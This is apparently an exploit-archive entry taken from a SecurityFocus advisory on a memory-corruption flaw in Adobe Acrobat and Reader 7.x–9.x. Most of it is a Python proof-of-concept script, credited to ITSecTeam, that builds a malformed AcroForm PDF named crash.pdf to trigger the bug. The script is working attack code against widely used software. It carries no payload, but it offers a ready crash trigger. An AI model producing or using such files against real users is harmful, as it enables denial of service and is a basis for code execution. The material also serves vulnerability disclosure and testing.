source: http://www.securityfocus.com/bid/42998/info

Adobe Acrobat and Reader are prone to a remote memory-corruption vulnerability.

Attackers can exploit this issue to execute arbitrary code or cause denial-of-service conditions. 

#!user/bin/python

_doc_ = '''
-------------------------------------------------------------------------
title : adobe acrobat reader acroform_PlugInMain memory corruption
Product: Adobe Acrobat Reader
Version: 7.x, 8.x, 9.x
Tested : 8.1 - 9.1 - 9.2 - 9.3.3 - 9.3.4
Product Homepage: www.adobe.com
Tested Os : Windows XP SP1/SP3 EN 
            Windows Seven
AUTHOR  : ITSecTeam
Email   : Bug@ITSecTeam.com
Website : http://www.itsecteam.com
Forum   : http://forum.ITSecTeam.com
--------------------------------------------------------------------------
'''
import sys


def main():
	buffer = "%PDF-1.7"
	buffer += "\n1 0 obj\n"
	buffer += "<<\n"
	buffer += "/Kids [2 0 R]\n"
	buffer += "/Count 1\n"
	buffer += "/Type /Pages\n"
	buffer += ">>\n"
	buffer += "endobj\n"
	buffer += "2 0 obj\n"
	buffer += "<<\n"
	buffer += "/Group\n"
	buffer += "<<\n"
	buffer += ">>\n"
	buffer += "/Parent 1 0 R\n"
	buffer += "/Annots [3 0 R ]\n"
	buffer += ">>\n"
	buffer += "endobj\n"
	buffer += "3 0 obj\n"
	buffer += "<<\n"
	buffer += "/Subtype /Widget\n"
	buffer += "/Rect []\n"
	buffer += "/FT /Btn\n"
	buffer += ">>\n"
	buffer += "endobj\n"
	buffer += "4 0 obj\n"
	buffer += "<<\n"
	buffer += "/Names\n"
	buffer += "<<\n"
	buffer += ">>\n"
	buffer += "/Pages 1 0 R\n"
	buffer += "/OCProperties\n"
	buffer += "<<\n"
	buffer += "/D\n"
	buffer += "<<\n"
	buffer += ">>\n"
	buffer += ">>\n"
	buffer += "/AcroForm\n" 
	buffer += "<<\n"
	buffer += "/NeedAppearances true\n"
	buffer += "/DR\n"
	buffer += "<<\n"
	buffer += "/Font\n" 
	buffer += "<<\n"
	buffer += ">>\n"
	buffer += ">>\n"
	buffer += ">>\n"
	buffer += "/ViewerPreferences\n"
	buffer += "<<\n"
	buffer += ">>\n"
	buffer += ">>\n"
	buffer += "endobj xref\n"
	buffer += "0000000000 65535 f\n" 
	buffer += "0000000015 00000 n\n"
	buffer += "0000000074 00000 n\n"
	buffer += "0000000199 00000 n\n"
	buffer += "0000000280 00000 n\n"
	buffer += "trailer\n"
	buffer += "<<\n"
	buffer += "/Root 4 0 R\n"
	buffer += "/Size 5\n"
	buffer += ">>\n"
	buffer += "startxref\n"
	buffer += "449\n"
	buffer += "%%EOF\n"
		
	
	try:
		print "[+] Creating POC file.."
		exploit = open('crash.pdf','w');
		exploit.write(buffer);
		exploit.close();
		print "[+] POC file created!"
	except:
		print "[-] Error: try again"
		sys.exit(0)
	
if __name__=="__main__":
	print _doc_
	main()
